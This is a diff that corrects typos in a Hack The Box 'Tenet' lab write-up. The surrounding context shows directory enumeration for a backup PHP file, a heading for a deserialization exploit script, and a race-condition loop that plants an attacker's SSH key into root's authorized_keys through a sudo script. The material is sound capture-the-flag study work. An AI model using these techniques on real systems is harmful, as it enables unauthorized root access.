@@ -1,6 +1,6 @@
 ![](tenet_banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></a>
 </p>
 
 # Scanning
@@ -50,7 +50,7 @@ PORT   STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-* Only 2 ports are aviable one is ssh and second is apache web_server.
+* Only 2 ports are available one is ssh and second is apache web_server.
 * port 80 has default apache web page.
 
 ## Gobuster
@@ -76,9 +76,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
       did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
 
-* comment is talking about some php file `sator.php` and its backup *normally file backups in linux stores with `.bak` extention.*
+* comment is talking about some php file `sator.php` and its backup *normally file backups in linux stores with `.bak` extension.*
 * after a while i found the file
-  * *i do some crazy terminal tricks and create a one liner to generate a list of possible locations on the server*, but hey, i'm learnin so thats good for practice.
+  * *i do some crazy terminal tricks and create a one liner to generate a list of possible locations on the server*, but hey, i'm learning so that's good for practice.
 
     `ffuf -u http://10.10.10.223/wordpress/FUZZ -w ~/git-tools/SecLists/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt:FUZZ -s | rev | cut -d/ -f2- | rev | sort | uniq | sed 's/^/wordpress/; s/$/\/sator.php/' | sed '1 i\sator.php' > find_sator.txt && gobuster dir -u http://10.10.10.223/ -w find_sator.txt -x bak && rm find_sator.txt`
 
@@ -112,7 +112,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
       [+] Grabbing users from text file <br>
       [] Database updated <br>
 
-* review backup file to understant what `sator.php` file doing in the background -
+* review backup file to understand what `sator.php` file doing in the background -
 
 ```php
 <?php
@@ -245,7 +245,7 @@ and `__destruct()` is the [magic method](https://www.php.net/manual/en/language.
 
 # User Exploit
 
-and here is the final automate script for exploiting this vulnarability -
+and here is the final automate script for exploiting this vulnerability -
 
 ```php
 <?php
@@ -407,7 +407,7 @@ checkAdded        //This function execute after key added to authorized_keys to 
 
 [what-is-umask-and-how-does-it-work](https://askubuntu.com/questions/44542/what-is-umask-and-how-does-it-work)
 
-* ok, So everything is happning in the `addkey()` function. when `$tmpName` is created this script append his `$key` in that file and than add it into the root ssh authorized_keys.
+* ok, So everything is happening in the `addkey()` function. when `$tmpName` is created this script append his `$key` in that file and than add it into the root ssh authorized_keys.
 
 **Attack Surface:**
 
@@ -416,7 +416,7 @@ checkAdded        //This function execute after key added to authorized_keys to 
 
       while true; do sudo /usr/local/bin/enableSSH.sh & echo "<public-ssh-key>" | tee /tmp/ssh-* 1>&2 & done
 
-  * i tried it multiple time and in 100 loop i get the sccusses
+  * i tried it multiple time and in 100 loop i get the success
 
 **Getting Root shell:**
 
